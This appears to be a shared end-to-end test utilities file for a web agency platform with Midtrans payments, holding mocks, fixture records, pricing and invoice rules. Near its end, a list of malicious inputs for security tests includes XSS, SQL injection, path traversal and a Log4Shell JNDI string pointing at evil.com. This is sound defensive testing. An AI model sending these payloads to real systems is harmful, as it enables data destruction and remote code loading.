/**
 * Shared E2E Test Utilities
 * Common fixtures, mocks, and helpers for end-to-end integration tests
 */

import { vi } from 'vitest';
import { getPrisma } from '@/lib/prisma';
import { checkRateLimit } from '@/lib/rate-limit';
import { validateMidtransSignature, parseMidtransWebhook } from '@/lib/midtrans';
import { jsonResponse, errorResponse } from '@/lib/api';

// Midtrans status mapping (mocked version for tests)
export const MIDTRANS_STATUS_MAP = {
    pending: 'waiting',
    settlement: 'paid',
    cancel: 'cancelled',
    deny: 'failed',
    expire: 'expired',
    refund: 'refunded',
} as const;

// Mock external dependencies
vi.mock('@/lib/prisma');
vi.mock('@/lib/rate-limit');
vi.mock('@/lib/midtrans');
vi.mock('@/lib/api');

export const mockPrisma = vi.mocked(getPrisma);
export const mockRateLimit = vi.mocked(checkRateLimit);
export const mockValidateMidtransSignature = vi.mocked(validateMidtransSignature);
export const mockParseMidtransWebhook = vi.mocked(parseMidtransWebhook);
export const mockJsonResponse = vi.mocked(jsonResponse);
export const mockErrorResponse = vi.mocked(errorResponse);

// Test data fixtures
export const testUserData = {
    id: 'test-user-id',
    email: 'integration-test@example.com',
    name: 'Integration Test User',
    phone: '+62812345678',
    password: 'hashed-password-123',
    role: 'client',
    createdAt: new Date('2025-12-21T00:00:00Z'),
    updatedAt: new Date('2025-12-21T00:00:00Z'),
};

export const testAdminData = {
    id: 'test-admin-id',
    email: 'admin-test@example.com',
    name: 'Admin Test User',
    phone: '+62811223344',
    password: 'admin-hashed-password-123',
    role: 'admin',
    createdAt: new Date('2025-12-21T00:00:00Z'),
    updatedAt: new Date('2025-12-21T00:00:00Z'),
};

export const testProjectData = {
    id: 'test-project-id',
    userId: testUserData.id,
    name: 'Company Website Project',
    type: 'company',
    status: 'pending_payment',
    url: null,
    credentials: null,
    createdAt: new Date('2025-12-21T00:00:00Z'),
    updatedAt: new Date('2025-12-21T00:00:00Z'),
};

export const testInvoiceData = {
    id: 'test-invoice-id',
    projectId: testProjectData.id,
    amount: 2000000,
    status: 'unpaid',
    midtransOrderId: null,
    qrisUrl: null,
    paidAt: null,
    createdAt: new Date('2025-12-21T00:00:00Z'),
    updatedAt: new Date('2025-12-21T00:00:00Z'),
};

export const testTemplateData = {
    id: 'test-template-id',
    name: 'Modern Business Template',
    description: 'Professional template for company websites',
    category: 'company',
    imageUrl: 'https://example.com/template.jpg',
    isActive: true,
    createdAt: new Date('2025-12-21T00:00:00Z'),
    updatedAt: new Date('2025-12-21T00:00:00Z'),
};

export const testPageData = {
    id: 'test-page-id',
    slug: 'about-us',
    title: 'About Our Company',
    content: 'We are a professional web development company...',
    isPublished: true,
    createdAt: new Date('2025-12-21T00:00:00Z'),
    updatedAt: new Date('2025-12-21T00:00:00Z'),
};

export const testPostData = {
    id: 'test-post-id',
    title: 'Latest Web Development Trends',
    slug: 'latest-web-development-trends',
    excerpt: 'Discover the newest trends in web development...',
    content: 'Full article content goes here...',
    isPublished: true,
    createdAt: new Date('2025-12-21T00:00:00Z'),
    updatedAt: new Date('2025-12-21T00:00:00Z'),
};

// Mock database client type
export interface MockDatabase {
    user: {
        findUnique: any;
        findFirst: any;
        findMany: any;
        create: any;
        update: any;
        delete: any;
        count: any;
    };
    project: {
        create: any;
        update: any;
        findMany: any;
        findUnique: any;
        delete: any;
        count: any;
    };
    invoice: {
        create: any;
        update: any;
        findMany: any;
        findUnique: any;
        count: any;
    };
    template: {
        findUnique: any;
        findMany: any;
        create: any;
        update: any;
        delete: any;
        count: any;
    };
    page: {
        findUnique: any;
        findMany: any;
        create: any;
        update: any;
        delete: any;
        count: any;
    };
    post: {
        findUnique: any;
        findMany: any;
        create: any;
        update: any;
        delete: any;
        count: any;
    };
    auditLog: {
        create: any;
        findMany: any;
        createMany: any;
        count: any;
    };
    $transaction: any;
}

// Setup function to create mock database client
export function createMockDatabase(): MockDatabase {
    return {
        user: {
            findUnique: vi.fn(),
            findFirst: vi.fn(),
            findMany: vi.fn(),
            create: vi.fn(),
            update: vi.fn(),
            delete: vi.fn(),
            count: vi.fn(),
        },
        project: {
            create: vi.fn(),
            update: vi.fn(),
            findMany: vi.fn(),
            findUnique: vi.fn(),
            delete: vi.fn(),
            count: vi.fn(),
        },
        invoice: {
            create: vi.fn(),
            update: vi.fn(),
            findMany: vi.fn(),
            findUnique: vi.fn(),
            count: vi.fn(),
        },
        template: {
            findUnique: vi.fn(),
            findMany: vi.fn(),
            create: vi.fn(),
            update: vi.fn(),
            delete: vi.fn(),
            count: vi.fn(),
        },
        page: {
            findUnique: vi.fn(),
            findMany: vi.fn(),
            create: vi.fn(),
            update: vi.fn(),
            delete: vi.fn(),
            count: vi.fn(),
        },
        post: {
            findUnique: vi.fn(),
            findMany: vi.fn(),
            create: vi.fn(),
            update: vi.fn(),
            delete: vi.fn(),
            count: vi.fn(),
        },
        auditLog: {
            create: vi.fn(),
            findMany: vi.fn(),
            createMany: vi.fn(),
            count: vi.fn(),
        },
        $transaction: vi.fn(),
    };
}

// Setup function to configure default mock behaviors
export function setupDefaultMocks(_mockDb: MockDatabase) {
    // Default successful rate limiting (null = allow request)
    mockRateLimit.mockResolvedValue(null);
    
    // Default successful API responses
    mockJsonResponse.mockImplementation((data) => new Response(JSON.stringify({ success: true, data }), {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
    }));
    mockErrorResponse.mockImplementation((error) => new Response(JSON.stringify({ success: false, error }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
    }));
}

// Helper to create many mock projects
export function createMockProjects(count: number, baseData = testProjectData): any[] {
    return Array.from({ length: count }, (_, i) => ({
        ...baseData,
        id: `project-${i}`,
        userId: `user-${i % 10}`,
        name: `Project ${i}`,
        createdAt: new Date(Date.now() - i * 1000),
    }));
}

// Helper to create many mock invoices
export function createMockInvoices(count: number, baseData = testInvoiceData): any[] {
    return Array.from({ length: count }, (_, i) => ({
        ...baseData,
        id: `invoice-${i}`,
        projectId: `project-${i}`,
        amount: 1000000 + (i * 100000),
        status: i % 4 === 0 ? 'paid' : 'unpaid',
        createdAt: new Date(Date.now() - i * 60000),
    }));
}

// Helper to aggregate dashboard metrics
export function calculateDashboardMetrics(projects: any[], invoices: any[]) {
    const completedProjects = projects.filter(p => p.status === 'completed').length;
    const inProgressProjects = projects.filter(p => p.status === 'in_progress').length;
    const pendingPaymentProjects = projects.filter(p => p.status === 'pending_payment').length;
    const totalSpent = invoices
        .filter(inv => inv.status === 'paid')
        .reduce((sum, inv) => sum + inv.amount, 0);
    const totalUnpaid = invoices
        .filter(inv => inv.status === 'unpaid')
        .reduce((sum, inv) => sum + inv.amount, 0);

    return {
        completedProjects,
        inProgressProjects,
        pendingPaymentProjects,
        totalSpent,
        totalUnpaid,
    };
}

// Pricing configuration
export const pricingMatrix = {
    sekolah: { base: 1500000, features: ['student_management', 'grading'] },
    berita: { base: 1750000, features: ['news_cms', 'comments'] },
    company: { base: 2000000, features: ['contact_form', 'gallery'] },
} as const;

// Valid project status transitions
export const validTransitions = {
    pending_payment: ['in_progress', 'cancelled'],
    in_progress: ['review', 'cancelled'],
    review: ['completed', 'in_progress'],
    completed: [],
    cancelled: [],
} as const;

// Invoice business rules
export const invoiceRules = {
    maxUnpaidInvoices: 3,
    paymentTimeoutDays: 7,
    autoReminderDays: [1, 3, 5],
    lateFeePercentage: 10,
} as const;

// Critical endpoints configuration
export const criticalEndpoints = [
    { path: '/api/auth/login', allowedRequests: 5, window: '15m' },
    { path: '/api/auth/register', allowedRequests: 3, window: '15m' },
    { path: '/api/client/payment', allowedRequests: 3, window: '5m' },
] as const;

// Malicious inputs for security testing
export const maliciousInputs = [
    '<script>alert("xss")</script>',
    "'; DROP TABLE users; --",
    '../../../etc/passwd',
    'javascript:alert(1)',
    '{{7*7}}',
    '${jndi:ldap://evil.com/a}',
    '"><img src=x onerror=alert(1)>',
] as const;

// Common error scenarios
export const transactionErrors = [
    'connection_timeout',
    'constraint_violation',
    'foreign_key_violation',
    'serialization_failure',
] as const;

// Database error scenarios
export const dbErrors = [
    'connection_timeout',
    'connection_refused',
    'too_many_connections',
    'deadlock_detected',
    'serialization_failure',
] as const;

// Payment failure scenarios
export const paymentFailureScenarios = [
    { status: 'deny', expectedInvoiceStatus: 'failed' },
    { status: 'cancel', expectedInvoiceStatus: 'cancelled' },
    { status: 'expire', expectedInvoiceStatus: 'expired' },
    { status: 'refund', expectedInvoiceStatus: 'refunded' },
] as const;
